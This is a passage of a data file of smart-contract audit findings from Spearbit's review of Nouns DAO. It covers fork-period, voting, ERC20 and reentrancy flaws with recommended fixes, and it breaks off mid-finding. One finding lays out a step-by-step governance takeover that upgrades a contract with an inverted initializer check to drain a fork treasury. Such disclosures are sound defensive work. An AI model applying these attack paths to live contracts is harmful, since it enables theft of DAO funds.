      "content": "## Security Advisory\n\n## Severity\n**Medium Risk**\n\n## Context\n**File:** NounsDAOV3Admin.sol  \n**Lines:** 516-L524\n\n## Description\nA malicious majority can reduce the number of Noun holders joining an executed fork by setting the `forkPeriod` to an unreasonably low value, e.g., 0, because there is no `MIN_FORK_PERIOD` enforced (MAX is 14 days). This, in combination with an unreasonably high `forkThresholdBPS` (no min/max enforced), will allow a malicious majority to hold captive those minority Noun holders who missed the fork escrow window, cannot join the fork in the unreasonably small fork period, and do not have sufficient voting power to fork again.\n\nWhile the accidental setting of the lower bound to an undesirable value poses a lower risk than that of the upper bound, this is yet another vector of attack by a malicious majority on forking capability/effectiveness. While the majority can upgrade the DAO entirely at will to circumvent all such guardrails, we hypothesize that would get more/all attention by token holders than modification of governance/fork parameters whose risk/impact may not be apparent immediately to non-technical or even technical holders.\n\nSo unless there is an automated impact review/analysis performed as part of governance processes, such proposal vectors on governance/forking parameters should be considered as posing non-negligible risk.\n\n## Impact\nInattentive minority Noun holders are unable to join the fork and are forced to stick with the original DAO.  \n**Low likelihood + High impact = Medium severity.**\n\n## Recommendation\n1. Consider a `MIN_FORK_PERIOD` value, e.g., 2 days for `forkPeriod`, which gives a better opportunity for inattentive/unsure minority Noun holders to join the fork now that it already exists.\n2. Consider preventing the decrease of `forkPeriod` if a fork is in the escrow period.\n\n## Nouns\n**Mitigation:** PR 716.  \n**Spearbit:** Verified that PR 716 fixes the issue by enforcing a `MIN_FORK_PERIOD` of 2 days in `_setForkPeriod()`.",
      "summary": "\nThis bug report concerns NounsDAOV3Admin.sol, a smart contract used to manage the forking of a distributed autonomous organization (DAO). The bug occurs when a malicious majority is able to set the forkPeriod to an unreasonably low value, e.g. 0, and the forkThresholdBPS to an unreasonably high value. This combination of parameters prevents inattentive minority Noun holders from being able to join the fork and forces them to stick with the original DAO. The severity of the bug is considered to be medium due to the low likelihood of it occurring and the high impact it has.\n\nThe bug is mitigated by PR 716, which enforces a MIN_FORK_PERIOD of 2 days in _setForkPeriod() . This gives inattentive minority Noun holders a better opportunity to join the fork. It is also recommended that the decrease of forkPeriod be prevented if a fork is in the escrow period.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21333",
      "title": "Key fork parameters are set outside of proposal flow, while aren't being controlled in the code",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n**ForkDAODeployer.sol#L31-L81**\n\n## Description\nThese configuration parameters are crucial for fork workflow and new DAO logic, but aren't checked when being set in `ForkDAODeployer`'s constructor:\n\n```solidity\ncontract ForkDAODeployer is IForkDAODeployer {\n...\nconstructor(\n    address tokenImpl_,\n    address auctionImpl_,\n    address governorImpl_,\n    address treasuryImpl_,\n    uint256 delayedGovernanceMaxDuration_,\n    uint256 initialVotingPeriod_,\n    uint256 initialVotingDelay_,\n    uint256 initialProposalThresholdBPS_,\n    uint256 initialQuorumVotesBPS_\n) {\n...\n    delayedGovernanceMaxDuration = delayedGovernanceMaxDuration_;\n    initialVotingPeriod = initialVotingPeriod_;\n    initialVotingDelay = initialVotingDelay_;\n    initialProposalThresholdBPS = initialProposalThresholdBPS_;\n    initialQuorumVotesBPS = initialQuorumVotesBPS_;\n}\n```\n\nWhile most parameters are set via proposals directly and are controlled in the corresponding setters, these 5 variables are defined only once on `ForkDAODeployer` construction and neither per se visible in proposals, as `ForkDAODeployer` is being set as an address there, nor being controlled within the corresponding setters this way. Their values aren't controlled on construction either.\n\n**NounsDAOLogicV3.sol#L820-L840**\n\n```solidity\n/**\n* @notice Admin function for setting the fork related parameters\n* @param forkEscrow_ the fork escrow contract\n* @param forkDAODeployer_ the fork dao deployer contract\n* @param erc20TokensToIncludeInFork_ the ERC20 tokens used when splitting funds to a fork\n* @param forkPeriod_ the period during which it's possible to join a fork after execution\n* @param forkThresholdBPS_ the threshold required of escrowed nouns in order to execute a fork\n*/\nfunction _setForkParams(\n    address forkEscrow_,\n    address forkDAODeployer_,\n    address[] calldata erc20TokensToIncludeInFork_,\n    uint256 forkPeriod_,\n    uint256 forkThresholdBPS_\n) external {\n    ds._setForkEscrow(forkEscrow_);\n    ds._setForkDAODeployer(forkDAODeployer_);\n    ds._setErc20TokensToIncludeInFork(erc20TokensToIncludeInFork_);\n    ds._setForkPeriod(forkPeriod_);\n    ds._setForkThresholdBPS(forkThresholdBPS_);\n}\n```\n\n**NounsDAOV3Admin.sol#L484-L495**\n\n```solidity\n/**\n* @notice Admin function for setting the fork DAO deployer contract\n*/\nfunction _setForkDAODeployer(NounsDAOStorageV3.StorageV3 storage ds, address newForkDAODeployer)\n    external\n    onlyAdmin(ds)\n{\n    address oldForkDAODeployer = address(ds.forkDAODeployer);\n    ds.forkDAODeployer = IForkDAODeployer(newForkDAODeployer);\n    emit ForkDAODeployerSet(oldForkDAODeployer, newForkDAODeployer);\n}\n```\n\n## Impact\nAs an example, setting `delayedGovernanceMaxDuration = 0` bypasses `NounsDAOLogicV1Fork`'s `checkGovernanceActive()` control and allows for stealing the whole treasury of a new forked DAO with `NounsTokenFork.claimFromEscrow() -> NounsDAOLogicV1Fork.quit()` call back-running `executeFork()` deployment transaction. An attacker will be entitled to 1 / 1 = 100% of the new DAO funds being the only one who claimed.\n\nSetting medium severity per low likelihood and high impact of misconfiguration, which can happen both as an operational mistake or be driven by malicious intent.\n\n## Recommendation\nConsider controlling `delayedGovernanceMaxDuration`, `initialVotingPeriod`, `initialVotingDelay`, `initialProposalThresholdBPS`, and `initialQuorumVotesBPS` in the constructor to be within the hard-coded boundary values. Slight increase in size and gas cost is well justified in this setting.\n\n## Nouns\nAcknowledged, won't fix. We disagree with the risk assessment and like the freedom the current approach affords us. \n\n**Why we think it's low risk:** These parameters are actually easy to review in any proposal that sets a fork deployer since the implementation is available on-chain with these parameters set.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the ForkDAODeployer.sol, a contract that is used for the fork workflow and new DAO logic. It has 5 configuration parameters that are crucial, but are not being checked when being set in the constructor of the ForkDAODeployer. These parameters are defined only once and are not visible in proposals, making them vulnerable to misuse. An example of this misuse is setting delayedGovernanceMaxDuration to 0, which can allow an attacker to steal the whole treasury of a new forked DAO. The severity of the bug is set as medium due to the low likelihood and high impact of misconfiguration. The recommendation is to control the parameters within the constructor to be within the hard-coded boundary values. The Nouns team has acknowledged the bug but won't fix it, as they disagree with the risk assessment and like the freedom the current approach affords them.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21332",
      "title": "Changing voteSnapshotBlockSwitchProposalId after it was set allows for votes double counting",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nNounsDAOV3Admin.sol#L472-L482\n\n## Description\nThe `nowds.voteSnapshotBlockSwitchProposalId` can be changed after it has been set to the next proposal ID, with no restrictions on repetitive setting. \n\nAt the same time, proposal votes are counted without saving the additional information needed to reconstruct the timing. A call to `_setVoteSnapshotBlockSwitchProposalId()` that moves forward the `voteSnapshotBlockSwitchProposalId` will create a situation where all older, already cast votes for the proposals where `withold_voteSnapshotBlockSwitchProposalId <= id < new_voteSnapshotBlockSwitchProposalId` will be counted as of `proposal.startBlock`. In contrast, all votes that are yet to be cast for the very same proposals will be counted as of `proposal.creationBlock`. \n\nSince the voting power of users can vary between these timestamps, this discrepancy will violate the equality of voting conditions for all such proposals. Double counting may occur, and total votes greater than total supply can be cast this way. For instance, if Bob transfers his nouns to Alice between `proposal.startBlock` and `proposal.creationBlock`, and Alice votes before the change while Bob votes after the change, Bob's nouns will be counted twice.\n\nThe severity is medium: the impact is likely to be high, as a violation of equal-foot voting allows for possible voting manipulation; however, the likelihood of passing a proposal for the second update for the `voteSnapshotBlockSwitchProposalId` is low. The latter could occur as part of a larger set of changes. The `_setVoteSnapshotBlockSwitchProposalId()` call does not take any arguments, and by itself, repeating it does not seem incorrect.\n\n## Recommendation\nConsider controlling the one-time switch nature of this parameter directly in the code, for example:\n\n- **NounsDAOV3Admin.sol#L34-L35**\n    ```solidity\n    error InvalidProposalUpdatablePeriodInBlocks();\n    + error VoteSnapshotSwitchAlreadySet();\n    ```\n\n- **NounsDAOV3Admin.sol#L472-L482**\n    ```solidity\n    function _setVoteSnapshotBlockSwitchProposalId(NounsDAOStorageV3.StorageV3 storage ds) external onlyAdmin(ds) {\n        uint256 newVoteSnapshotBlockSwitchProposalId = ds.proposalCount + 1;\n        uint256 oldVoteSnapshotBlockSwitchProposalId = ds.voteSnapshotBlockSwitchProposalId;\n        + if (oldVoteSnapshotBlockSwitchProposalId > 0) {\n        +     revert VoteSnapshotSwitchAlreadySet();\n        + }\n        uint256 newVoteSnapshotBlockSwitchProposalId = ds.proposalCount + 1;\n        ds.voteSnapshotBlockSwitchProposalId = newVoteSnapshotBlockSwitchProposalId;\n        emit VoteSnapshotBlockSwitchProposalIdSet(\n            oldVoteSnapshotBlockSwitchProposalId,\n            newVoteSnapshotBlockSwitchProposalId\n        );\n    }\n    ```\n\n## Nouns:\nImplemented recommendation: PR 718.  \n**Spearbit**: Fix looks good.",
      "summary": "\nThis bug report is about a vulnerability in the NounsDAOV3Admin.sol#L472-L482 code which allows the voteSnapshotBlockSwitchProposalId to be changed multiple times. This can lead to a situation where votes casted before the change will be counted as of proposal.startBlock, while votes casted after the change will be counted as of proposal.creationBlock. This would violate the equality of voting conditions for all such proposals, and double counting will be possible. The severity of the bug is medium, as the impact is high, but the likelihood of it happening is low.\n\nTo fix this vulnerability, a recommendation was made to control the one time switch nature of the parameter directly in the code, by adding an error VoteSnapshotSwitchAlreadySet() and reverting the call if the parameter has already been set. This recommendation was implemented with PR 718 and the fix looks good.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21331",
      "title": "Including non-standard ERC20 tokens will revert and prevent forking/quitting",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- NounsDAOExecutorV2.sol#L223\n- NounsDAOV3Fork.sol#L228-L229\n- NounsDAOLogicV1Fork.sol#L213-L214\n\n## Description\n`Iferc20TokensToIncludeInFork` or `erc20TokensToIncludeInQuit` accidentally or maliciously include non-confirming ERC20 tokens, such as USDT, which do not return a boolean value on transfers. Consequently, `sendProRataTreasury()` and `quit()` will revert because they expect `timelock.sendERC20()` to return true from the underlying ERC20 transfer call. The use of `transfer()` instead of `safeTransfer()` allows this scenario.\n\n- **Likelihood:** Low\n- **Impact:** High  \n= **Severity:** Medium\n\nInclusion of USDT-like tokens in the protocol will cause `sendProRataTreasury()` and `quit()` to revert, preventing forking or quitting.\n\n## Recommendation\nConsider the use of `safeTransfer()` instead of `transfer()` in `sendERC20()` and remove the check in callers on the expected boolean return value.\n\n## Nouns\nAcknowledged. Fixed in this PR 720.\n\n## Spearbit\nVerified that PR 720 fixes the issue as recommended.",
      "summary": "\nThis bug report deals with the NounsDAOExecutorV2.sol, NounsDAOV3Fork.sol, and NounsDAOLogicV1Fork.sol files. It states that iferc20TokensToIncludeInFork orerc20TokensToIncludeInQuit accidentally or maliciously include non-confirming ERC20 tokens, such as USDT, which do not return a boolean value on transfers, then the sendProRataTreasury() and quit() functions will revert. This is because it expects timelock.sendERC20() to return true from the underlying ERC20 transfer call. The use of transfer() instead of safeTransfer() allows this scenario, making it a medium risk. The inclusion of USDT-like tokens in the protocol will revert sendProRataTreasury() and quit() to prevent forking/quitting.\n\nThe recommendation is to consider the use of safeTransfer() instead of transfer() insendERC20() and remove the check in callers on the expected boolean return value. This was acknowledged and fixed in PR 720, which was verified to fix the issue as recommended.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21330",
      "title": "Fork escrowers can exploit the fork or force late joiners to quit",
      "impact": "MEDIUM",
      "content": "## Medium Risk Report\n\n**Severity:** Medium Risk  \n**Context:** NounsDAOLogicV1Fork.sol#L347  \n\n## Description\nBased on the current supply of Nouns and the following parameters that will be used during the upgrade to V3:\n- **Nouns total supply:** 743\n- **forkThresholdBPS_:** 2000 (20%)\n- **forkThreshold:** 148 \n\nHence, 149 Nouns need to be escrowed to be able to call `executeFork()`. The following attack vector would be possible:\n\n1. Attacker escrows 75 tokens.\n2. Bob escrows 74 tokens to reach the `forkThreshold`.\n3. Bob calls `executeFork()` and `claimFromEscrow()`.\n4. Attacker calls `claimFromEscrow()` right away. As now `nouns.remainingTokensToClaim()` is zero, the governance is now active and proposals can be created.\n5. Attacker creates a malicious proposal. Currently, the attacker has 75 Nouns and Bob has 74 in the fork. This means that the attacker has the majority of the voting power, and whatever he proposes cannot be denied.\n   - `NounsForkToken.getPriorVotes(attacker, <proposalCreationBlock>) -> 75`\n   - `NounsForkToken.getPriorVotes(Bob, <proposalCreationBlock>) -> 74`\n6. The proposal is created with the following description: *\"Proposal created to upgrade the NounsAuctionHouseFork to a new implementation similar to the main NounsAuctionHouse\"*. The attacker deploys this new implementation and simply performs the following change in the code:\n\n```solidity\nmodifier initializer() {\n- require(_initializing || !_initialized, \"Initializable: contract is already initialized\");\n+ require(!_initializing || _initialized, \"Initializable: contract is already initialized\");\n    bool isTopLevelCall = !_initializing;\n    if (isTopLevelCall) {\n        _initializing = true;\n        _initialized = true;\n    }\n    _;\n    if (isTopLevelCall) {\n        _initializing = false;\n    }\n}\n```\n\nThe proposal is created with the following data:\n- `targets[0] = address(contract_NounsAuctionHouseFork);`\n- `values[0] = 0;`\n- `signatures[0] = 'upgradeTo(address) ';`\n- `calldatas[0] = abi.encode(address(contract_NounsAuctionHouseForkExploitableV1));`\n\n7. Proposal is created and is now in Pending state. During the next days, users keep joining the fork, increasing the funds of the fork treasury as the fork period is still active.\n8. Five days later, the proposal is in Active state, and the attacker votes to pass it. Bob, who does not like the proposal, votes to reject it.\n   - **quorumVotes:** 14\n   - **forVotes:** 75\n   - **againstVotes:** 74\n9. As the attacker and Bob were the only users that had any voting power at the time of proposal creation, five days later, the proposal is successful.\n10. Proposal is queued.\n11. Three weeks later, the proposal is executed.\n12. The `NounsAuctionHouseFork` contract is upgraded to the malicious version, and the attacker re-initializes it and sets himself as the owner:\n    ```\n    contract_NounsAuctionHouseFork.initialize(attacker, NounsForkToken, <WETH address>, 0, 0, 0, 0)\n    ```\n13. The attacker, who is now the owner, upgrades the `NounsAuctionHouseFork` contract once again to a new implementation that implements the following function:\n    ```solidity\n    function burn(uint256[] memory _nounIDs) external onlyOwner {\n        for (uint256 i; i < _nounIDs.length; ++i) {\n            nouns.burn(_nounIDs[i]);\n        }\n    }\n    ```\n14. The attacker now burns all the Nouns Tokens in the fork except the ones that he owns.\n15. The attacker calls `quit()`, draining the whole treasury:\n    - `NounsTokenFork.totalSupply() -> 75`\n    - `attacker.balance -> 0`\n    - `contract_stETH.balanceOf(attacker) -> 0`\n    - `forkTreasury.balance -> 2005_383580080753701211`\n    - `contract_stETH.balanceOf(forkTreasury) -> 2005_383580080753701210`\n    - Attacker calls -> `contract_NounsDAOLogicV1Fork.quit([0, ... 74])`\n    - `attacker.balance -> 2005_383580080753701211`\n    - `contract_stETH.balanceOf(attacker) -> 2005_383580080753701208`\n    - `forkTreasury.balance -> 0`\n    - `contract_stETH.balanceOf(forkTreasury) -> 1`\n\nBasically, the condition that should be met for this exploit is that at the time of proposal creation the attacker has more than 51% of the voting power. This is more likely to happen in small forks. If this happens, users will be forced to leave or be exploited. As there is no vetoer role, no one will be able to stop this type of proposal.\n\n## Recommendation\nConsider removing the `checkGovernanceActive()` function and, instead, do not allow users to create any proposal in the fork until the fork period is not active anymore or, which is the same: `isForkPeriodActive == false`. Consider also auditing any new proposal that is added to the DAO to mitigate these risks.\n\n## Acknowledgments\n- **Nouns:** Followed Spearbit's recommendation and fixed the issue in the PR 717. Proposals cannot be created, and users cannot quit the fork until the forking period is over.\n- **Spearbit:** Acknowledged.",
      "summary": "\nThis bug report is about an attack vector that would be possible if certain parameters were used during the upgrade of Nouns to version V3. The attack vector would involve an attacker escrowing 75 tokens and Bob escrowing 74 tokens to reach the forkThreshold of 149 tokens. Bob would then call executeFork() and claimFromEscrow() and the attacker would call claimFromEscrow() right away. This would mean that the governance is now active and proposals can be created. The attacker would then create a malicious proposal with the majority of the voting power and deploy a new implementation that would allow them to burn all the Nouns tokens in the fork except the ones they own. To prevent this type of attack, Spearbit suggested that the checkGovernanceActive() function should be removed and users should not be allowed to create any proposal in the fork until the fork period is not active anymore. They also suggested auditing any new proposal that is added to the DAO. Spearbit followed their recommendation and fixed the issue in the PR 717. Proposals can not be created and users can not quit the fork until the forking period is over.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21329",
      "title": "Upgrading timelock without transferring the nouns from old timelock balance will increase adjusted total supply",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nProposeTimelockMigrationCleanupMainnet.s.sol#L94\n\n## Description\nThere is one noun on timelock V1 balance, and there can be others as of migration time:\n\n- [Etherscan Token Link](https://etherscan.io/token/0x9c8ff314c9bc7f6e59a9d9225fb22946427edc03?a=0x0BC3807Ec262cB779b38D65b38158acC3bfedE10)\n\nChanging `ds.timelock` without nouns transfer will increase adjusted total supply:\n\n- NounsDAOV3Fork.sol#L199-L201\n\n```solidity\nfunction adjustedTotalSupply(NounsDAOStorageV3.StorageV3 storage ds) internal view returns (uint256) {\n    return ds.nouns.totalSupply() - ds.nouns.balanceOf(address(ds.timelock)) - ds.forkEscrow.numTokensOwnedByDAO(); \n}\n```\n\nAs of the time of this writing, `adjustedTotalSupply()` will be increased by 1 due to treasury token reclassification. The upgrade will cause a \n\n```\n(13470 + 14968) * 1733.0 * (1 / 742 - 1 / 743) = 89 USD loss per noun\nor\n(13470 + 14968) * 1733.0 / 743 = 66330 USD cumulatively for all nouns holders.\n```\n\nPer high likelihood and low impact, the severity is set to medium.\n\n## Recommendation\nConsider adding to ProposeTimelockMigrationCleanupMainnet the step of moving the treasury nouns from timelock V1 to timelock V2 contract to keep `adjustedTotalSupply()` reading unchanged.\n\n## Nouns\nFixed in PR 721.\n\n## Spearbit\nFix looks okay. Conditional on that `timelockV1` owns no other nouns besides 687 as of the time of the upgrade.",
      "summary": "\nThis bug report is regarding the total supply of a token. The severity of the bug is medium risk. The context of the bug is ProposeTimelockMigrationCleanupMainnet.s.sol#L94. The bug states that there is one noun on timelock V1 balance, and can be others as of migration time. Changing ds.timelock without nouns transfer will increase adjusted total supply and cause a loss per noun or cumulatively for all nouns holders. The recommendation is to consider adding to ProposeTimelockMigrationCleanupMainnet the step of moving the treasury nouns from timelock V1 to timelock V2 contract to keep adjustedTotalSupply() reading unchanged. The nouns have been fixed in PR 721 and the fix looks okay on the condition that timelockV1 owns no other nouns besides 687as of time of the upgrade. \n\nIn summary, this bug report is about the total supply of a token. The severity of the bug is medium risk and the context is ProposeTimelockMigrationCleanupMainnet.s.sol#L94. It states that changing ds.timelock without nouns transfer will increase adjusted total supply and cause a loss per noun or cumulatively for all nouns holders. The recommendation is to consider adding the step of moving the treasury nouns from timelock V1 to timelock V2 contract to keep adjustedTotalSupply() reading unchanged. The nouns have been fixed in PR 721 and the fix looks okay on the condition that timelockV1 owns no other nouns besides 687as of time of the upgrade.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21328",
      "title": "Inattentive fork escrowers may lose funds to fork quitters",
      "impact": "MEDIUM",
      "content": "## Severity\n**Medium Risk**\n\n## Context\n- Fork-Spec NounsTokenFork.sol#L148-L157 \n- NounsDAOLogicV1Fork.sol#L346-L349\n- NounsDAOLogicV1Fork.sol#L201-L222\n\n## Description\nFork escrowers already have their original DAO treasury pro rate funds transferred to the fork DAO treasury (when the fork executes) and are expected to `claimFromEscrow()` after the fork executes to mint their fork DAO tokens and thereby lay claim on their pro rata share of the fork DAO treasury for governance or exiting. Inattentive fork escrowers who fail to do so will force a delayed governance of **30 days** (currently proposed value) on the fork DAO, and beyond that, will allow fork DAO members to quit with a greater share of the fork DAO treasury because fork execution transfers all escrowers' original DAO treasury funds to the fork DAO treasury.\n\nInattentive slow-/non-claiming fork escrowers may lose funds to quitters if they do not claim their fork DAO tokens before its governance becomes active in **30 days** after the fork executes. They will also be unaccounted for in DAO functions like quorum and proposal threshold.\n\nWhile we would expect fork escrowers to be attentive and claim their fork DAO tokens well within the delayed governance period, the protocol design can be more defensive towards slow-/non-claimers by protecting their funds on the fork DAO from quitters.\n\n**Low likelihood + High impact = Medium severity.**\n\n## Recommendation\nConsider changing `NounsDAOLogicV1Fork.adjustedTotalSupply()` to be `nouns.totalSupply() - nouns.balanceOf(address(timelock)) + nouns.remainingTokensToClaim()` which will include any unclaimed tokens in fork DAO calculations. This will effectively freeze the slow-/non-claiming fork escrowers' funds within the fork DAO treasury instead of them losing it to quitters (outside of any executed proposals acting on treasury funds) if they do not claim within **30 days**.\n\nNon-claimers will permanently affect the fork DAO supply, which affects proposals/quitting, but that is valid because unclaimed original DAO escrowed tokens have a perpetual **1:1 right** on equivalent fork DAO tokens which should be accounted for correctly.\n\n## Nouns\nAcknowledged, and here's a fix PR: [nounsDAO/nouns-monorepo#723](https://github.com/nounsDAO/nouns-monorepo/pull/723).\n\n## Spearbit\nVerified that PR 723 fixes the issue as recommended.",
      "summary": "\nThis bug report discusses a potential issue with the Fork-Spec NounsTokenFork.sol, NounsDAOLogicV1Fork.sol, and NounsDAOLogicV1Fork.sol. The issue is that fork escrowers who fail to claim their fork DAO tokens after the fork executes may lose funds to quitters if they do not claim within 30 days. This has been determined to be a medium severity risk due to the low likelihood and high impact. \n\nA recommendation has been made to consider changing the NounsDAOLogicV1Fork.adjustedTotalSupply() to include any unclaimed tokens in fork DAO calculations. This would effectively freeze the slow-/non-claiming fork escrowers' funds within the fork DAO treasury instead of them losing it to quitters. \n\nThis change has been acknowledged and a fix PR has been opened (nounsDAO/nouns-monorepo#723). This fix has been verified to solve the issue as recommended.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21327",
      "title": "A malicious DAO can mint arbitrary fork DAO tokens",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- NounsDAOV3Proposals.sol#L495\n- NounsDAOV3Fork.sol#L203-L205\n- NounsTokenFork.sol#L166-L174\n\n## Description\nThe original DAO is assumed to be honest during the fork period, which is reinforced in the protocol by preventing it from executing any malicious proposals during that time. Fork joiners are minted fork DAO tokens by the original DAO via `claimDuringForkPeriod()`, which enforces the fork period on the fork DAO side. \n\nHowever, the notion of fork period is different on the fork DAO compared to the original DAO (as described in Issue 16). While the original DAO excludes `forkEndTimestamp` from the fork period, the fork DAO includes `forkingPeriodEndTimestamp` in its notion of the fork period.\n\nIf the original DAO executes a malicious proposal exactly in the block at `forkEndTimestamp`, which makes a call to `claimDuringForkPeriod()` to mint arbitrary fork DAO tokens, then the proposal will succeed on the original DAO side because it is one block beyond its notion of the fork period. The `claimDuringForkPeriod()` will succeed on the fork DAO side because it is in the last block in its notion of the fork period. \n\nThe original DAO, therefore, can successfully mint arbitrary fork DAO tokens which can be used to:\n1. Brick the fork DAO when those tokens are attempted to be minted via auctions later, or \n2. Manipulate the fork DAO governance to steal its treasury funds.\n\nIn PoS, blocks are exactly 12 seconds apart. With `forkEndTimestamp = block.timestamp + ds.forkPeriod` and `ds.forkPeriod` now set to 7 days, `forkEndTimestamp` is exactly 50400 blocks (7*24*60*60/12) after the block in which `executeFork()` was executed. A malicious DAO can coordinate to execute such a proposal exactly in that block.\n\nLow likelihood + High impact = Medium severity.\n\n## Recommendation\nMake the treatment of fork period consistent between the original and fork DAOs in:\n\n```solidity\nfunction claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external {\n    if (msg.sender != escrow.dao()) revert OnlyOriginalDAO();\n    - if (block.timestamp > forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod();\n    + if (block.timestamp >= forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod();\n    for (uint256 i = 0; i < tokenIds.length; i++) {\n        uint256 nounId = tokenIds[i];\n        _mintWithOriginalSeed(to, nounId);\n    }\n}\n```\n\n## Nouns\n- **Implemented fix:** nounsDAO/nouns-monorepo#719.\n- **Spearbit:** Verified that PR 719 fixes the issue as recommended.",
      "summary": "\nThis bug report is about a vulnerability in the NounsDAOV3Proposals, NounsDAOV3Fork and NounsTokenFork smart contracts. It has been assigned a Medium Risk severity. \n\nThe vulnerability is that the original DAO is assumed to be honest during the fork period, however, the notion of the fork period is different on the fork DAO compared to the original DAO. If the original DAO executes a malicious proposal in the block at forkEndTimestamp, it will succeed on the original DAO side, but also mint arbitrary fork DAO tokens on the fork DAO side. This means that the original DAO can potentially manipulate the fork DAO governance to steal its treasury funds.\n\nThe recommendation to fix the issue is to make the treatment of fork period consistent between the original and fork DAOs in the NounsTokenFork smart contract. The fix has been implemented in nounsDAO/nouns-monorepo#719 and verified by Spearbit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21326",
      "title": "NounsDAOLogicV1Fork's quit() performing external calls in-between total supply and balance reads can allow for treasury funds stealing via cross-contract reentrancy",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nNounsDAOLogicV1Fork.sol#L201-L222\n\n## Description\nLet's suppose there is an initiative group of nouns holders that performed a fork, claimed, and immediately quit (say for pure financial reasons). Right after that, it is `block.timestamp < forkingPeriodEndTimestamp`, so `isForkPeriodActive(ds) == true` in the original DAO contract, while `NounsTokenFork.remainingTokensToClaim() == 0`, so `checkGovernanceActive()` doesn't revert in the forked DAO contract, which has no material holdings.\n\nFor simplicity, let's say there is Bob and Alice, both of whom aren't part of this group and still are in the original DAO. Bob has 2 nouns, Alice has 1, each noun's share of treasury is 1 stETH and 100 ETH, with `erc20TokensToIncludeInQuit = [stETH]`.\n\nAll the above are going concern assumptions (a part of expected workflow). Now, let's consider a low probability one: the stETH contract was upgraded and now performs `_beforetokentransfer()` callback on every transfer to a destination address as long as it's a contract (i.e., it has a callback; for simplicity, let's assume it behaves similarly to ERC-721 `safeTransfer`). This upgrade doesn't make it malicious or break `IERC20`; let's just suppose there is a strong enough technical reason for such an upgrade.\n\nIf Alice now decides to join this fork, Bob can steal from her:\n\n1. Alice calls `NounsDAOV3's joinFork()`, and 1 stETH and 100 ETH are transferred to `NounsDAOLogicV1Fork`:\n    ```solidity\n    function joinFork(\n        NounsDAOStorageV3.StorageV3 storage ds,\n        uint256[] calldata tokenIds,\n        uint256[] calldata proposalIds,\n        string calldata reason\n    ) external {\n        if (!isForkPeriodActive(ds)) revert ForkPeriodNotActive();\n        INounsDAOForkEscrow forkEscrow = ds.forkEscrow;\n        address timelock = address(ds.timelock);\n        sendProRataTreasury(ds, ds.forkDAOTreasury, tokenIds.length, adjustedTotalSupply(ds));\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            ds.nouns.transferFrom(msg.sender, timelock, tokenIds[i]);\n        }\n        NounsTokenFork(ds.forkDAOToken).claimDuringForkPeriod(msg.sender, tokenIds);\n        emit JoinFork(forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason);\n    }\n    ```\n   \n   